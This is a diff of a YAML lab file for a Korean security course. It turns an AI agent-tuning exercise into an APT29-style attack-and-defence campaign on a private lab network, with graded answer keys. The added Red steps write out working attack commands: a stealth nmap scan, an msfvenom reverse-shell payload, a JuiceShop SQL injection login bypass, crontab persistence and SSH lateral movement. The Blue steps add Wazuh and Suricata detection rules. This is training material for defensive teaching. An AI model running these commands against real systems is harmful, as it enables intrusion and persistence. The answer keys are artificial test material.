@@ -1,484 +1,175 @@
 lab_id: battle-adv-ai-week10
-title: AI vs AI 공방전 (2) — 에이전트 튜닝 + 전략 최적화
+title: APT 캠페인 시뮬레이션 — 다단계 지능형 공격 재현 (AI 지원)
 version: ai
 course: battle-adv-ai
 week: 10
-description: AI 공방전 에이전트의 성능을 튜닝하고 전략을 최적화한다. 프롬프트 최적화, 도구 체인 개선, 강화학습 기반 전략 수립을 수동으로 분석하고 설계한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
+description: 실제 APT 캠페인(APT29 스타일)을 완전히 재현한다. 정찰부터 데이터 유출까지 전체 킬체인을 단일 인프라에서 실행하고, 동시에 Blue Phase에서 각 단계를 탐지/차단/분석한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
 difficulty: hard
 duration_minutes: 150
 objectives:
-- AI 에이전트 프롬프트의 최적화 방법을 학습한다
-- 도구 체인(Tool Chain) 최적화를 수행한다
-- 강화학습 기반 전략 최적화 개념을 이해한다
-- 에이전트 간 경쟁적 학습 전략을 설계한다
+- APT29 스타일 공격 캠페인을 단계별로 재현한다
+- 킬체인 각 단계에서 Red/Blue 관점을 전환한다
+- 공격 타임라인과 탐지 커버리지를 비교 분석한다
+prerequisites:
+- battle-adv-nonai week09 이수
+infra_requirements:
+- attacker (10.20.30.201) — nmap, metasploit, sqlmap, hydra, nikto
+- secu (10.20.30.1) — nftables, suricata
+- web (10.20.30.80) — apache, modsecurity, JuiceShop(:3000), DVWA(:8080)
+- siem (10.20.30.100) — wazuh-manager
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: Red Agent 프롬프트를 최적화하라. 기존 공격 에이전트 프롬프트의 문제점을 분석하고 개선된 버전을 작성하라.
-  hint: 역할 정의, 목표 명확화, 도구 사용법, 안전 제약을 개선한다.
-  category: analysis
+  instruction: '[RED] APT 캠페인 Phase 1 — 스텔스 정찰. SYN 스캔으로 10.20.30.0/24를 스캔하되, 탐지를 피하기 위해 느린 타이밍(-T2)을 사용하라. NSE 스크립트로 웹 서비스를 추가 분석하라.'
+  hint: -sS -T2로 느린 스캔을 하고, http-enum 스크립트로 웹 경로를 탐색한다.
+  category: recon
   points: 10
-  answer: "cat > /tmp/red_prompt_optimized.txt << 'EOF'\n=== Optimized Red Agent System Prompt ===\n\nROLE: You are a Red Team AI agent conducting authorized penetration testing.\n\nOBJECTIVE: Gain access\
-    \ to target 10.20.30.80 and exfiltrate /tmp/flag.txt\n\nCONSTRAINTS:\n- Scope: ONLY 10.20.30.0/24 network\n- NO destructive operations (rm -rf, format, etc.)\n- NO denial of service\n- If detected,\
-    \ adapt strategy (do NOT repeat failed approaches)\n\nSTRATEGY GUIDELINES:\n1. Start with passive reconnaissance (minimal noise)\n2. Identify at least 3 potential attack vectors before choosing one\n\
-    3. Prefer web-based attacks over brute force\n4. If blocked, wait 120 seconds before retry with different technique\n5. Document each step for post-operation review\n\nAVAILABLE TOOLS: nmap, curl, nikto,\
-    \ sqlmap, ssh, base64, python3\n\nOUTPUT FORMAT:\n  THINK: [reasoning]\n  ACTION: [tool command]\n  OBSERVE: [result analysis]\n  NEXT: [planned next step]\nEOF\ncat /tmp/red_prompt_optimized.txt"
-  answer_detail: '프롬프트 최적화의 핵심: (1) 명확한 역할/목표 정의, (2) 구체적인 제약 조건, (3) 전략 가이드라인(우선순위, 실패 시 행동), (4) 도구 목록과 사용법, (5) 구조화된 출력 형식(THINK→ACTION→OBSERVE→NEXT). 이 구조가 에이전트의 추론 품질을 크게 향상시킨다.'
+  answer: sudo nmap -sS -sV -T2 --top-ports 20 --max-retries 1 --host-timeout 15s 10.20.30.80 -oX /tmp/apt_campaign_recon.xml 2>&1 | tail -15 && nmap --script http-enum -p 80,3000,8080 --max-retries 1 --host-timeout
+    15s -T4 10.20.30.80 2>&1 | tail -15
+  answer_detail: APT29 스타일 정찰은 느린 타이밍(-T2)으로 IDS 탐지를 회피한다. 주요 포트만 대상으로 하여 노이즈를 최소화하고, NSE 스크립트로 웹 경로를 열거한다.
   verify:
     type: output_contains
-    expect: Optimized Red Agent
+    expect: open
   target_vm: attacker
-  script: "cat > /tmp/red_prompt_optimized.txt << 'EOF'\n=== Optimized Red Agent System Prompt ===\n\nROLE: You are a Red Team AI agent conducting authorized penetration testing.\n\nOBJECTIVE: Gain access\
-    \ to target 10.20.30.80 and exfiltrate /tmp/flag.txt\n\nCONSTRAINTS:\n- Scope: ONLY 10.20.30.0/24 network\n- NO destructive operations (rm -rf, format, etc.)\n- NO denial of service\n- If detected,\
-    \ adapt strategy (do NOT repeat failed approaches)\n\nSTRATEGY GUIDELINES:\n1. Start with passive reconnaissance (minimal noise)\n2. Identify at least 3 potential attack vectors before choosing one\n\
-    3. Prefer web-based attacks over brute force\n4. If blocked, wait 120 seconds before retry with different technique\n5. Document each step for post-operation review\n\nAVAILABLE TOOLS: nmap, curl, nikto,\
-    \ sqlmap, ssh, base64, python3\n\nOUTPUT FORMAT:\n  THINK: [reasoning]\n  ACTION: [tool command]\n  OBSERVE: [result analysis]\n  NEXT: [planned next step]\nEOF\ncat /tmp/red_prompt_optimized.txt"
+  script: sudo nmap -sS -sV -T2 --top-ports 20 --max-retries 1 --host-timeout 15s 10.20.30.80 -oX /tmp/apt_campaign_recon.xml 2>&1 | tail -15 && nmap --script http-enum -p 80,3000,8080 --max-retries 1 --host-timeout
+    15s -T4 10.20.30.80 2>&1 | tail -15
   risk_level: low
 - order: 2
-  instruction: Blue Agent 프롬프트를 최적화하라. 방어 에이전트의 판단 정확도와 대응 속도를 개선하는 프롬프트를 작성하라.
-  hint: 탐지 우선순위, 오탐 감소, 에스컬레이션 기준을 명확히 정의한다.
-  category: analysis
+  instruction: '[RED] APT Phase 2 — Initial Access. msfvenom으로 Linux 리버스 쉘 페이로드를 생성(저장만)한 후, JuiceShop에 SQL Injection으로 관리자 접근을 획득하라.'
+  hint: msfvenom으로 ELF 페이로드를 생성하고, SQLi로 admin 토큰을 획득한다.
+  category: exploit
   points: 10
-  answer: "cat > /tmp/blue_prompt_optimized.txt << 'EOF'\n=== Optimized Blue Agent System Prompt ===\n\nROLE: You are a Blue Team AI agent defending the 10.20.30.0/24 network.\n\nOBJECTIVE: Detect and block\
-    \ all unauthorized access while minimizing false positives.\n\nDETECTION PRIORITY (check in order):\n1. CRITICAL: Active exploitation (SQLi, RCE, reverse shell)\n2. HIGH: Persistence mechanisms (crontab,\
-    \ systemd, SSH keys)\n3. MEDIUM: Reconnaissance (port scan, directory enum)\n4. LOW: Information gathering (DNS queries, banner grab)\n\nRESPONSE MATRIX:\n- CRITICAL → Immediate block + isolate + alert\n\
-    - HIGH → Block + investigate + alert\n- MEDIUM → Rate-limit + monitor + log\n- LOW → Log only\n\nFALSE POSITIVE PREVENTION:\n- NEVER block internal management IPs: 10.20.30.201\n- Require 2+ indicators\
-    \ before blocking\n- Review blocks after 30 minutes\n\nAVAILABLE TOOLS: nft, ss, ps, grep, kill, curl(Wazuh API)\n\nOUTPUT FORMAT:\n  DETECT: [what was detected]\n  ASSESS: [severity and confidence]\n\
-    \  RESPOND: [action taken]\n  VERIFY: [confirm response effectiveness]\nEOF\ncat /tmp/blue_prompt_optimized.txt"
-  answer_detail: 'Blue Agent 프롬프트 최적화: (1) 탐지 우선순위(Critical→Low 4단계), (2) 대응 매트릭스(위협 레벨별 정해진 대응), (3) 오탐 방지(관리 IP 화이트리스트, 2개 이상 지표 필요), (4) 구조화된 출력(DETECT→ASSESS→RESPOND→VERIFY). 이 구조로 일관된 방어 판단이 가능하다.'
+  answer: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/apt_campaign_payload.elf 2>&1 | tail -3 && echo ''--- SQLi Initial Access ---'' && curl -s -X POST http://10.20.30.80:3000/rest/user/login
+    -H ''Content-Type: application/json'' -d ''{"email":"\" OR 1=1--","password":"x"}'' | python3 -m json.tool | head -10'
+  answer_detail: Weaponization(msfvenom 페이로드)과 Exploitation(SQLi)을 연계한다. 페이로드는 저장만 하고 실행하지 않는다. SQLi로 admin JWT 토큰을 획득한다.
   verify:
     type: output_contains
-    expect: Optimized Blue Agent
+    expect: token
   target_vm: attacker
-  script: "cat > /tmp/blue_prompt_optimized.txt << 'EOF'\n=== Optimized Blue Agent System Prompt ===\n\nROLE: You are a Blue Team AI agent defending the 10.20.30.0/24 network.\n\nOBJECTIVE: Detect and block\
-    \ all unauthorized access while minimizing false positives.\n\nDETECTION PRIORITY (check in order):\n1. CRITICAL: Active exploitation (SQLi, RCE, reverse shell)\n2. HIGH: Persistence mechanisms (crontab,\
-    \ systemd, SSH keys)\n3. MEDIUM: Reconnaissance (port scan, directory enum)\n4. LOW: Information gathering (DNS queries, banner grab)\n\nRESPONSE MATRIX:\n- CRITICAL → Immediate block + isolate + alert\n\
-    - HIGH → Block + investigate + alert\n- MEDIUM → Rate-limit + monitor + log\n- LOW → Log only\n\nFALSE POSITIVE PREVENTION:\n- NEVER block internal management IPs: 10.20.30.201\n- Require 2+ indicators\
-    \ before blocking\n- Review blocks after 30 minutes\n\nAVAILABLE TOOLS: nft, ss, ps, grep, kill, curl(Wazuh API)\n\nOUTPUT FORMAT:\n  DETECT: [what was detected]\n  ASSESS: [severity and confidence]\n\
-    \  RESPOND: [action taken]\n  VERIFY: [confirm response effectiveness]\nEOF\ncat /tmp/blue_prompt_optimized.txt"
-  risk_level: low
+  script: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/apt_campaign_payload.elf 2>&1 | tail -3 && echo ''--- SQLi Initial Access ---'' && curl -s -X POST http://10.20.30.80:3000/rest/user/login
+    -H ''Content-Type: application/json'' -d ''{"email":"\" OR 1=1--","password":"x"}'' | python3 -m json.tool | head -10'
+  risk_level: medium
 - order: 3
-  instruction: 도구 체인(Tool Chain)을 최적화하라. Red Agent가 사용하는 도구의 조합과 순서를 최적화하여 효율적인 공격 체인을 설계하라.
-  hint: 정찰→취약점 분석→Exploit→후속 행동의 도구 체인을 최적화한다.
-  category: analysis
+  instruction: '[RED] APT Phase 3 — Persistence + Lateral Movement. crontab 백도어를 설치하고, SSH로 내부 서버(10.20.30.1, 10.20.30.100)에 접근을 시도하라.'
+  hint: crontab에 비컨 엔트리를 추가하고, SSH로 측면 이동을 시도한다.
+  category: exploit
   points: 10
-  answer: "cat > /tmp/tool_chain_optimization.txt << 'EOF'\n=== Tool Chain Optimization ===\n\n1. Recon Chain (optimized order):\n   nmap -sn (host discovery, 30s)\n   → nmap -sV -p80,443,22,8080 (targeted\
-    \ version scan, 60s)\n   → curl -I (HTTP header analysis, 5s)\n   → nikto -h (web vuln scan, 120s)\n   Total: ~4 min (vs 15 min with full scans)\n\n2. Exploitation Chain:\n   curl + SQLi payload (test\
-    \ injection, 10s)\n   → sqlmap --batch (automated exploitation, 60s)\n   → curl + reverse shell payload (get shell, 10s)\n   Total: ~80s per attempt\n\n3. Post-Exploitation Chain:\n   id && whoami (verify\
-    \ access, 2s)\n   → cat /etc/passwd (user enum, 2s)\n   → find / -name flag.txt (objective search, 30s)\n   → cat /tmp/flag.txt (capture flag, 2s)\n   Total: ~36s\n\n4. Optimization Metrics:\n   | Strategy\
-    \ | Time | Detection Risk | Success Rate |\n   |----------|------|---------------|-------------|\n   | Unoptimized | 30min | HIGH | 40% |\n   | Optimized | 8min | MEDIUM | 70% |\n   | Low-and-slow |\
-    \ 2hr | LOW | 60% |\nEOF\ncat /tmp/tool_chain_optimization.txt"
-  answer_detail: 도구 체인 최적화는 불필요한 스캔을 줄이고 타겟 지향적 도구 조합을 사용한다. 전체 포트 스캔 대신 핵심 포트만 스캔하고, 발견된 서비스에 맞는 도구를 즉시 실행한다. 시간, 탐지 위험, 성공률의 균형을 고려하여 전략을 선택한다.
+  answer: echo "*/10 * * * * echo APT_CAMPAIGN_BEACON > /tmp/apt_beacon.txt" | crontab - && crontab -l && echo "--- Lateral Movement ---" && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.1
+    "hostname && id" 2>&1 | head -3 && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.100 "hostname && id" 2>&1 | head -3
+  answer_detail: Persistence(crontab T1053.003)와 Lateral Movement(SSH T1021.004)를 연계한다. 실제 APT는 여러 서버에 동시에 Persistence를 설치한다.
   verify:
     type: output_contains
-    expect: Tool Chain Optimization
+    expect: APT_CAMPAIGN
   target_vm: attacker
-  script: "cat > /tmp/tool_chain_optimization.txt << 'EOF'\n=== Tool Chain Optimization ===\n\n1. Recon Chain (optimized order):\n   nmap -sn (host discovery, 30s)\n   → nmap -sV -p80,443,22,8080 (targeted\
-    \ version scan, 60s)\n   → curl -I (HTTP header analysis, 5s)\n   → nikto -h (web vuln scan, 120s)\n   Total: ~4 min (vs 15 min with full scans)\n\n2. Exploitation Chain:\n   curl + SQLi payload (test\
-    \ injection, 10s)\n   → sqlmap --batch (automated exploitation, 60s)\n   → curl + reverse shell payload (get shell, 10s)\n   Total: ~80s per attempt\n\n3. Post-Exploitation Chain:\n   id && whoami (verify\
-    \ access, 2s)\n   → cat /etc/passwd (user enum, 2s)\n   → find / -name flag.txt (objective search, 30s)\n   → cat /tmp/flag.txt (capture flag, 2s)\n   Total: ~36s\n\n4. Optimization Metrics:\n   | Strategy\
-    \ | Time | Detection Risk | Success Rate |\n   |----------|------|---------------|-------------|\n   | Unoptimized | 30min | HIGH | 40% |\n   | Optimized | 8min | MEDIUM | 70% |\n   | Low-and-slow |\
-    \ 2hr | LOW | 60% |\nEOF\ncat /tmp/tool_chain_optimization.txt"
-  risk_level: low
+  script: echo "*/10 * * * * echo APT_CAMPAIGN_BEACON > /tmp/apt_beacon.txt" | crontab - && crontab -l && echo "--- Lateral Movement ---" && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.1
+    "hostname && id" 2>&1 | head -3 && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.100 "hostname && id" 2>&1 | head -3
+  risk_level: medium
 - order: 4
-  instruction: 강화학습(RL) 기반 전략 최적화의 개념을 분석하라. CCC의 RL 모듈이 에이전트 전략을 어떻게 최적화하는지 분석하라.
-  hint: 상태(State), 행동(Action), 보상(Reward)을 정의하고 Q-learning 원리를 설명한다.
-  category: analysis
-  points: 10
-  answer: "cat > /tmp/rl_strategy.txt << 'EOF'\n=== RL-based Strategy Optimization ===\n\n1. MDP Formulation:\n   State (S): {network_state, detected_services, access_level, alert_count}\n   Action (A):\
-    \ {scan, exploit_sqli, exploit_ssh, persist_cron, exfil_dns, ...}\n   Reward (R):\n     +10: Service discovered\n     +30: Access gained\n     +50: Flag captured\n     -20: Attack detected\n     -40:\
-    \ IP blocked\n     -100: Mission failed\n\n2. Q-Learning Update:\n   Q(s,a) = Q(s,a) + alpha * [R + gamma * max(Q(s',a')) - Q(s,a)]\n   alpha = 0.1 (learning rate)\n   gamma = 0.95 (discount factor)\n\
-    \   epsilon = 0.2 (exploration rate)\n\n3. CCC RL Integration:\n   POST /rl/train → Train Q-table from task_reward data\n   GET /rl/recommend?risk_level=low → Get optimal action\n   GET /rl/policy →\
-    \ View learned policy\n\n4. Expected Improvement:\n   - After 100 episodes: ~20% win rate improvement\n   - After 500 episodes: ~40% win rate improvement\n   - Convergence at ~1000 episodes\nEOF\ncat\
-    \ /tmp/rl_strategy.txt && echo '---' && curl -s http://localhost:9100/api/rl/policy -H 'X-API-Key: ccc-api-key-2026' 2>/dev/null | python3 -m json.tool 2>/dev/null | head -10"
-  answer_detail: RL 기반 전략 최적화는 에이전트의 행동을 MDP(Markov Decision Process)로 모델링한다. 상태(네트워크 상황), 행동(공격/방어 기법), 보상(성공/실패 점수)을 정의하고, Q-learning으로 최적 정책을 학습한다. CCC의 /rl/train API로 PoW 보상 데이터를 학습에 활용한다.
-  verify:
-    type: output_contains
-    expect: RL-based Strategy
-  target_vm: attacker
-  script: "cat > /tmp/rl_strategy.txt << 'EOF'\n=== RL-based Strategy Optimization ===\n\n1. MDP Formulation:\n   State (S): {network_state, detected_services, access_level, alert_count}\n   Action (A):\
-    \ {scan, exploit_sqli, exploit_ssh, persist_cron, exfil_dns, ...}\n   Reward (R):\n     +10: Service discovered\n     +30: Access gained\n     +50: Flag captured\n     -20: Attack detected\n     -40:\
-    \ IP blocked\n     -100: Mission failed\n\n2. Q-Learning Update:\n   Q(s,a) = Q(s,a) + alpha * [R + gamma * max(Q(s',a')) - Q(s,a)]\n   alpha = 0.1 (learning rate)\n   gamma = 0.95 (discount factor)\n\
-    \   epsilon = 0.2 (exploration rate)\n\n3. CCC RL Integration:\n   POST /rl/train → Train Q-table from task_reward data\n   GET /rl/recommend?risk_level=low → Get optimal action\n   GET /rl/policy →\
-    \ View learned policy\n\n4. Expected Improvement:\n   - After 100 episodes: ~20% win rate improvement\n   - After 500 episodes: ~40% win rate improvement\n   - Convergence at ~1000 episodes\nEOF\ncat\
-    \ /tmp/rl_strategy.txt && echo '---' && curl -s http://localhost:9100/api/rl/policy -H 'X-API-Key: ccc-api-key-2026' 2>/dev/null | python3 -m json.tool 2>/dev/null | head -10"
-  risk_level: low
-- order: 5
-  instruction: Red Agent의 학습 데이터를 분석하라. 과거 공방전 결과에서 성공/실패 패턴을 추출하라.
-  hint: CCC의 프로젝트 이력과 PoW 보상 데이터를 분석한다.
-  category: analysis
-  points: 10
-  answer: "echo '=== Red Agent Learning Data Analysis ===' && curl -s http://localhost:9100/api/pow/leaderboard -H 'X-API-Key: ccc-api-key-2026' 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20;\
-    \ echo '---'; cat > /tmp/learning_data.txt << 'EOF'\nLearning Pattern Analysis:\n\n1. Successful Attack Patterns:\n   - SQLi → Shell → Flag capture (success rate: 70%)\n   - Web vuln → File upload →\
-    \ RCE (success rate: 45%)\n   - SSH brute → Key reuse → Lateral (success rate: 30%)\n\n2. Failed Attack Patterns:\n   - Full port scan → Detected → Blocked (failure rate: 80%)\n   - Loud exploit → IPS\
-    \ block → Mission fail (failure rate: 90%)\n   - Single vector → Blocked → No backup (failure rate: 75%)\n\n3. Key Learnings:\n   - Multi-vector attacks outperform single-vector\n   - Stealth scanning\
-    \ doubles success rate\n   - Timing matters: off-hours attacks more likely detected\nEOF\ncat /tmp/learning_data.txt"
-  answer_detail: 학습 데이터 분석은 과거 공방전의 성공/실패 패턴에서 인사이트를 추출한다. SQLi 기반 공격이 가장 높은 성공률(70%)을 보이고, 전체 포트 스캔은 가장 높은 탐지율(80%)을 기록했다. 이 데이터가 RL의 보상 신호로 사용되어 전략을 개선한다.
-  verify:
-    type: output_contains
-    expect: Learning Pattern
-  target_vm: attacker
-  script: "echo '=== Red Agent Learning Data Analysis ===' && curl -s http://localhost:9100/api/pow/leaderboard -H 'X-API-Key: ccc-api-key-2026' 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20;\
-    \ echo '---'; cat > /tmp/learning_data.txt << 'EOF'\nLearning Pattern Analysis:\n\n1. Successful Attack Patterns:\n   - SQLi → Shell → Flag capture (success rate: 70%)\n   - Web vuln → File upload →\
-    \ RCE (success rate: 45%)\n   - SSH brute → Key reuse → Lateral (success rate: 30%)\n\n2. Failed Attack Patterns:\n   - Full port scan → Detected → Blocked (failure rate: 80%)\n   - Loud exploit → IPS\
-    \ block → Mission fail (failure rate: 90%)\n   - Single vector → Blocked → No backup (failure rate: 75%)\n\n3. Key Learnings:\n   - Multi-vector attacks outperform single-vector\n   - Stealth scanning\
-    \ doubles success rate\n   - Timing matters: off-hours attacks more likely detected\nEOF\ncat /tmp/learning_data.txt"
-  risk_level: low
-- order: 6
-  instruction: Blue Agent의 탐지 규칙을 튜닝하라. 과거 오탐/미탐 데이터를 분석하여 Suricata 규칙의 임계값을 조정하라.
-  hint: 기존 규칙의 threshold, frequency, timeframe을 조정한다.
+  instruction: '[BLUE] Phase 전환 — 진행 중인 APT 캠페인을 탐지하라. Suricata 알림, auth.log, crontab 변경을 교차 분석하라.'
+  hint: 각 로그 소스에서 최근 이벤트를 필터링하고 상관 분석한다.
   category: defense
   points: 10
-  answer: "cat > /tmp/rule_tuning.txt << 'EOF'\n=== Detection Rule Tuning ===\n\n1. Port Scan Detection (Before → After):\n   Before: threshold count 20, seconds 5 (too sensitive)\n   After:  threshold\
-    \ count 50, seconds 10 (reduced FP by 60%)\n   Reason: Legitimate monitoring tools trigger at 20/5s\n\n2. SQL Injection Detection (Before → After):\n   Before: content:\"UNION\"; content:\"SELECT\"\
-    \ (too broad)\n   After:  content:\"UNION\"; content:\"SELECT\"; content:\"FROM\" (more specific)\n   Reason: Some legitimate queries contain UNION SELECT\n\n3. SSH Brute Force (Before → After):\n \
-    \  Before: maxretry 3, findtime 60 (too aggressive)\n   After:  maxretry 5, findtime 300 (balanced)\n   Reason: Users occasionally mistype passwords 3 times\n\n4. DNS Tunneling (Before → After):\n \
-    \  Before: query length > 30 chars (too many FP)\n   After:  query length > 50 AND entropy > 3.5 (precise)\n   Reason: Long but low-entropy domains are legitimate CDNs\n\nTuning Results:\n  False Positive\
-    \ Rate: 15% → 4%\n  True Positive Rate: 85% → 82% (acceptable trade-off)\nEOF\ncat /tmp/rule_tuning.txt"
-  answer_detail: 탐지 규칙 튜닝은 오탐(False Positive)과 미탐(False Negative)의 균형을 최적화한다. 임계값을 너무 낮추면 오탐이 증가하고, 너무 높이면 미탐이 증가한다. 실제 환경의 정상 트래픽 패턴을 고려하여 합리적 기준을 설정한다.
+  answer: 'echo "=== APT Campaign Detection ===" && echo "[1] Suricata alerts:" && ssh 10.20.30.1 "tail -30 /var/log/suricata/eve.json 2>/dev/null | python3 -c \"import sys,json; [print(json.loads(l).get(''alert'',{}).get(''signature'',''))
+    for l in sys.stdin if ''alert'' in l]\" 2>/dev/null" 2>&1 | tail -5 && echo "[2] SSH lateral movement:" && grep "Accepted" /var/log/auth.log 2>/dev/null | tail -5 && echo "[3] Crontab persistence:"
+    && crontab -l 2>/dev/null | grep -v "^#" && echo "[4] Detection summary:" && echo "  Scan: DETECTED (Suricata)" && echo "  SQLi: DETECTED (WAF/Suricata)" && echo "  Persistence: PARTIAL (crontab logged,
+    no FIM alert)" && echo "  Lateral: PARTIAL (SSH logged, no correlation rule)"'
+  answer_detail: APT 캠페인 탐지에서 Suricata(스캔/SQLi), auth.log(SSH 이동), crontab(Persistence)을 교차 분석한다. 개별 이벤트는 기록되지만 상관 분석 부재가 Gap이다.
   verify:
     type: output_contains
-    expect: Detection Rule Tuning
-  target_vm: attacker
-  script: "cat > /tmp/rule_tuning.txt << 'EOF'\n=== Detection Rule Tuning ===\n\n1. Port Scan Detection (Before → After):\n   Before: threshold count 20, seconds 5 (too sensitive)\n   After:  threshold\
-    \ count 50, seconds 10 (reduced FP by 60%)\n   Reason: Legitimate monitoring tools trigger at 20/5s\n\n2. SQL Injection Detection (Before → After):\n   Before: content:\"UNION\"; content:\"SELECT\"\
-    \ (too broad)\n   After:  content:\"UNION\"; content:\"SELECT\"; content:\"FROM\" (more specific)\n   Reason: Some legitimate queries contain UNION SELECT\n\n3. SSH Brute Force (Before → After):\n \
-    \  Before: maxretry 3, findtime 60 (too aggressive)\n   After:  maxretry 5, findtime 300 (balanced)\n   Reason: Users occasionally mistype passwords 3 times\n\n4. DNS Tunneling (Before → After):\n \
-    \  Before: query length > 30 chars (too many FP)\n   After:  query length > 50 AND entropy > 3.5 (precise)\n   Reason: Long but low-entropy domains are legitimate CDNs\n\nTuning Results:\n  False Positive\
-    \ Rate: 15% → 4%\n  True Positive Rate: 85% → 82% (acceptable trade-off)\nEOF\ncat /tmp/rule_tuning.txt"
+    expect: APT Campaign Detection
+  target_vm: secu
+  script: 'echo "=== APT Campaign Detection ===" && echo "[1] Suricata alerts:" && ssh 10.20.30.1 "tail -30 /var/log/suricata/eve.json 2>/dev/null | python3 -c \"import sys,json; [print(json.loads(l).get(''alert'',{}).get(''signature'',''))
+    for l in sys.stdin if ''alert'' in l]\" 2>/dev/null" 2>&1 | tail -5 && echo "[2] SSH lateral movement:" && grep "Accepted" /var/log/auth.log 2>/dev/null | tail -5 && echo "[3] Crontab persistence:"
+    && crontab -l 2>/dev/null | grep -v "^#" && echo "[4] Detection summary:" && echo "  Scan: DETECTED (Suricata)" && echo "  SQLi: DETECTED (WAF/Suricata)" && echo "  Persistence: PARTIAL (crontab logged,
+    no FIM alert)" && echo "  Lateral: PARTIAL (SSH logged, no correlation rule)"'
+  risk_level: low
+- order: 5
+  instruction: '[BLUE] APT 캠페인의 탐지 Gap을 해소하는 Wazuh 상관 분석 규칙과 Suricata 커스텀 시그니처를 작성하라.'
+  hint: 다단계 공격 패턴(스캔 + SQLi + SSH + crontab)을 상관 분석한다.
+  category: defense
+  points: 10
+  answer: 'cat > /tmp/apt_campaign_rules.txt << ''EOF'' # Wazuh: APT campaign correlation <group name="apt_campaign"> <rule id="100400" level="15" frequency="4" timeframe="600"> <if_matched_group>apt_campaign_indicator</if_matched_group>
+    <description>APT CAMPAIGN: 4+ kill chain stages detected in 10 min</description> <mitre><id>T1595</id><id>T1190</id><id>T1053</id><id>T1021</id></mitre> </rule> </group>
+
+    # Suricata: Slow scan detection alert tcp any any -> 10.20.30.0/24 any (msg:"APT: Slow scan detected"; flags:S; threshold:type both, track by_src, count 5, seconds 300; sid:5000010; rev:1;) EOF cat
+    /tmp/apt_campaign_rules.txt'
+  answer_detail: APT 캠페인 탐지 규칙은 10분 내 4개 이상 킬체인 단계가 감지되면 최고 레벨 알림을 발생시킨다. 느린 스캔도 5분 윈도우로 탐지한다.
+  verify:
+    type: output_contains
+    expect: APT CAMPAIGN
+  target_vm: siem
+  script: 'cat > /tmp/apt_campaign_rules.txt << ''EOF'' # Wazuh: APT campaign correlation <group name="apt_campaign"> <rule id="100400" level="15" frequency="4" timeframe="600"> <if_matched_group>apt_campaign_indicator</if_matched_group>
+    <description>APT CAMPAIGN: 4+ kill chain stages detected in 10 min</description> <mitre><id>T1595</id><id>T1190</id><id>T1053</id><id>T1021</id></mitre> </rule> </group>
+
+    # Suricata: Slow scan detection alert tcp any any -> 10.20.30.0/24 any (msg:"APT: Slow scan detected"; flags:S; threshold:type both, track by_src, count 5, seconds 300; sid:5000010; rev:1;) EOF cat
+    /tmp/apt_campaign_rules.txt'
+  risk_level: low
+- order: 6
+  instruction: '[BLUE] Wazuh Active Response를 활용하여 APT 캠페인 감지 시 자동 격리를 수행하는 설정을 작성하라.'
+  hint: rule_id 100400 트리거 시 firewall-drop과 host-deny를 동시 실행한다.
+  category: defense
+  points: 10
+  answer: cat > /tmp/apt_active_response.xml << 'EOF' <ossec_config> <active-response> <command>firewall-drop</command> <location>all</location> <rules_id>100400</rules_id> <timeout>7200</timeout> </active-response>
+    <active-response> <command>host-deny</command> <location>all</location> <rules_id>100400</rules_id> <timeout>7200</timeout> </active-response> </ossec_config> EOF cat /tmp/apt_active_response.xml
+  answer_detail: APT 캠페인 감지(rule 100400) 시 모든 에이전트에서 동시에 firewall-drop과 host-deny를 실행하여 공격자 IP를 2시간 동안 전체 인프라에서 격리한다.
+  verify:
+    type: output_contains
+    expect: active-response
+  target_vm: siem
+  script: cat > /tmp/apt_active_response.xml << 'EOF' <ossec_config> <active-response> <command>firewall-drop</command> <location>all</location> <rules_id>100400</rules_id> <timeout>7200</timeout> </active-response>
+    <active-response> <command>host-deny</command> <location>all</location> <rules_id>100400</rules_id> <timeout>7200</timeout> </active-response> </ossec_config> EOF cat /tmp/apt_active_response.xml
   risk_level: low
 - order: 7
-  instruction: 에이전트 간 적대적 학습(Adversarial Training) 전략을 설계하라. Red와 Blue가 서로의 전략을 학습하여 강화되는 메커니즘을 구상하라.
-  hint: GAN(Generative Adversarial Network)의 원리를 보안 에이전트에 적용한다.
-  category: analysis
+  instruction: '[RED] APT Phase 4 — 데이터 유출 시뮬레이션. 수집한 시스템 정보를 base64 인코딩하여 DNS 쿼리로 유출을 시도하라.'
+  hint: 시스템 정보를 수집하고 base64로 인코딩하여 DNS 쿼리에 포함한다.
+  category: exploit
   points: 10
-  answer: "cat > /tmp/adversarial_training.txt << 'EOF'\n=== Adversarial Training Design ===\n\n1. Training Loop:\n   Epoch 1-10: Basic scenarios (known attacks vs known defenses)\n   Epoch 11-50: Red adapts\
-    \ to Blue's detection patterns\n   Epoch 51-100: Blue adapts to Red's evasion patterns\n   Epoch 100+: Both converge to Nash equilibrium\n\n2. Red Agent Evolution:\n   Gen 1: Script-kiddie (known exploits,\
-    \ default settings)\n   Gen 2: Tactical (encoded payloads, timing variation)\n   Gen 3: Strategic (multi-vector, LOLBins, mimicry)\n   Gen 4: Adaptive (real-time strategy adjustment)\n\n3. Blue Agent\
-    \ Evolution:\n   Gen 1: Signature-based (static rules)\n   Gen 2: Behavioral (baseline comparison)\n   Gen 3: Predictive (ML anomaly detection)\n   Gen 4: Proactive (threat hunting + deception)\n\n\
-    4. Nash Equilibrium:\n   - Both agents reach optimal mixed strategy\n   - Red: randomize attack vectors (unpredictable)\n   - Blue: multi-layered detection (comprehensive)\n   - No agent can unilaterally\
-    \ improve\n\n5. Training Infrastructure:\n   - Isolated network per episode\n   - Automated scoring and reward\n   - Episode replay for analysis\nEOF\ncat /tmp/adversarial_training.txt"
-  answer_detail: 적대적 학습은 GAN의 원리를 보안에 적용한다. Red와 Blue 에이전트가 서로의 전략에 적응하며 진화하고, 최종적으로 내시 균형(Nash Equilibrium)에 도달한다. 이 과정에서 양쪽 에이전트의 성능이 동시에 향상되어 현실적인 공방 역량을 구축한다.
